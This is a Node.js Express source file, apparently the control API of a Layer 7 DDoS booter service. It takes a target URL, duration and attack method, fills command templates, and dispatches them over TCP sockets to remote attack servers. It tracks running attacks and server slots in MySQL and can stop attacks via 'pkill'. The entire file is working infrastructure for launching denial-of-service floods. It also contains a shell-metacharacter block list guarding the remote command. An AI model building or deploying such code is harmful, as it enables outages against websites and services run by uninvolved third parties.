const express = require('express');
const net = require('net');
const mysql = require('mysql');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@', '`', '´'];

const app = express();
app.use(express.json());

//data for the API
const servers = require('./servers.json');
const commands = require('./commands.json');
const settings = require('./settings.json');

const pool = mysql.createPool({
    connectionLimit: 10,
    host: settings.database.host,
    user: settings.database.user,
    password: settings.database.password,
    database: settings.database.database
});
  
const socket_token = settings.socket_token;
const api_port = settings.api_port;

function queryDatabase(query, params) {
    return new Promise((resolve, reject) => {
        pool.getConnection((err, connection) => {
            if (err) {
                reject(err);
                return;
            }
    
            connection.query(query, params, (error, results) => {
                connection.release();
                if (error) {
                    reject(error);
                } else {
                    resolve(results);
                }
            });
        });
    });
}
 
app.get(`/api/attack`, async (req, res) => {
    const attack_id = Math.floor((Math.random() * 125000));

    const field = {
        host: req.query.host || undefined,
        time: req.query.time || undefined,
        method: req.query.method || undefined,
        server: req.query.server || undefined,
        //you may add extra fields, but make sure to validade them against remote code execution
    };

    //check fields
    const containsBlacklisted = blackList.some(char => field.host.includes(char));
    if (!field.host || !urlRegex.test(field.host) || containsBlacklisted) return res.json({ status: 500, data: `host needs to be a valid URL` });
    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `time needs to be a number between 1-86400` });
    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase())) return res.json({ status: 500, data: `invalid attack method` });

    try {

        const availableServers = [];

        for (const serverId in servers) {
            const server = servers[serverId];
            const [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [serverId]);
        
            if (running < server.slots) {
                availableServers.push({ id: serverId, ...server });
            }
        }
        
        if (availableServers.length === 0) {
            return res.json({ status: 500, data: `no available servers, please try again later` });
        }

        const command = commands[field.method.toUpperCase()]
            .replace('${attack_id}', attack_id)
            .replace('${host}', field.host)
            .replace('${time}', field.time);
    
        const data = {
            socket_token: socket_token,
            command: command
        };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(availableServers[0].id, encodedData);

        if (!response.includes("success")) {
            await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);

            return res.json({
                status: 500,
                message: 'failed to start attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase("INSERT INTO `attacks` VALUES(NULL, ?, ?, ?, ?, UNIX_TIMESTAMP(), 0, ?)", [availableServers[0].id, field.host, field.time, field.method, attack_id]);

        return res.json({
            status: 200,
            message: 'attack started successfully',
            id: attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms",
            data: {
                host: field.host,
                time: field.time,
                method: field.method
            }
        });
    } catch (e) {
        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);

        return res.json({
            status: 200,
            message: 'failed to start attack',
        });
    }

});

app.get(`/api/stop`, async (req, res) => {

    const field = {
        attack_id: req.query.attack_id || undefined
    };

    if (!field.attack_id || isNaN(field.attack_id)) return res.json({ status: 500, data: `invalid attack id` });

    try {

        var server = await queryDatabase('SELECT `server` FROM `attacks` WHERE `attack_id` = ?', [field.attack_id]);

        const data = { socket_token: socket_token, command: `screen -dm pkill -f ${field.attack_id}` };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(server[0].server, encodedData);

        if (!response.includes("success")) {
            return res.json({
                status: 500,
                message: 'failed to stop attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [field.attack_id]);

        return res.json({
            status: 200,
            message: 'attack stopped successfully',
            id: field.attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms"
        });

    } catch (e) {

        return res.json({
            status: 200,
            message: 'failed to stop attack',
        });
    }

});

app.get(`/api/stop_all`, async (req, res) => {

    try {

        var activeServers = await queryDatabase('SELECT DISTINCT `server` FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');

        const startTime = process.hrtime();
    
        for (var i = 0; i < activeServers.length; i++) {

            var server = activeServers[i].server;
        
            const data = { socket_token: socket_token, command: `screen -dm pkill -f attack_` };
    
            const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');
    
            const response = await sendData(server, encodedData);
    
            if (!response.includes("success")) {
                return res.json({
                    status: 500,
                    message: 'failed to stop attacks',
                });
            };

            await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `server` = ?', [server]);

        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
    

        return res.json({
            status: 200,
            message: 'attacks stopped successfully',
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms"
        });

    } catch (e) {
        return res.json({
            status: 200,
            message: 'failed to stop attack',
        });
    }

});

app.get('/api/status', async (req, res) => {

    try {

        var activeServers = await queryDatabase('SELECT DISTINCT `server` FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');
    
        var responseObject = {
            status: 200,
            message: 'server information',
            serverAttacks: {}
        };
    
        for (var i = 0; i < activeServers.length; i++) {

            var server = activeServers[i].server;
        
            var attacks = await queryDatabase('SELECT target, method, attack_id FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [server]);
        
            var [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [server]);
        
            responseObject.serverAttacks[server] = {
                attacks: attacks,
                usedSlots: running
            };

        }
    
        return res.json(responseObject);

    } catch (e) {

        return res.json({
            status: 200,
            message: 'failed to get information',
        });
    }

});

app.listen(api_port, () => console.log(`Layer7 Socket API started on port ${api_port}`));

function sendData(serverId, data) {
    return new Promise((resolve, reject) => {
        const server = servers[serverId];
        if (server) {
            const socket = new net.Socket();

            socket.connect(server.port, server.host, () => {
                socket.write(data);
            });

            socket.on('data', (result) => {
                const response = result.toString();
                socket.destroy();
                resolve(response);
            });

            socket.on('error', (err) => {
                socket.destroy();
                reject('error');
            });
        } else {
            reject('error');
        }
    });
}
